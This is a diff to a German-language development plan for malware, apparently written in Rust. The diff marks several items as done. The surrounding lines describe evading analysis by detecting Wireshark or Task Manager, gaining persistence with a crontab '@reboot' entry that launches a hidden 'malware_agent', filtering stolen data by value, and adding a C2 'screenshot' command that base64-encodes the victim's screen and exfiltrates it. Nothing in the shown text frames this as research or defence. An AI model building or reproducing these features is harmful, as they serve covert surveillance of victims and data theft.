@@ -138,6 +138,8 @@ Prüfen, ob Tools wie Wireshark oder Task Manager laufen.
     }
     ```
 
+
+- [x] **DONE**
 ---
 
 ## 2. Advanced Persistence Mechanismen 
@@ -165,6 +167,9 @@ Der Klassiker unter Linux.
     1.  Aktuelle Crontab lesen: `crontab -l`.
     2.  Neue Zeile anhängen: `@reboot /home/user/.hidden/malware_agent`.
     3.  Zurückschreiben: `crontab -`.
+
+
+- [x] **DONE**
 
 ---
 
@@ -206,12 +211,18 @@ Nicht alles blind exfiltrieren, sondern nach Wert filtern.
     }
     ```
 
+- [x] **DONE**
+
+
 #### B. Screenshot-Funktion
 Dem Angreifer zeigen, was das Opfer sieht.
 
 *   **Rust Crate:** `screenshots`.
 *   **Integration:**
     Neuer C2-Befehl `screenshot`. Bei Empfang Screenshot machen, als PNG im Speicher halten, Base64 codieren und als `EXFIL_DATA:screen.png:<base64>` senden.
+
+
+- [x] **DONE**
 
 ---
 
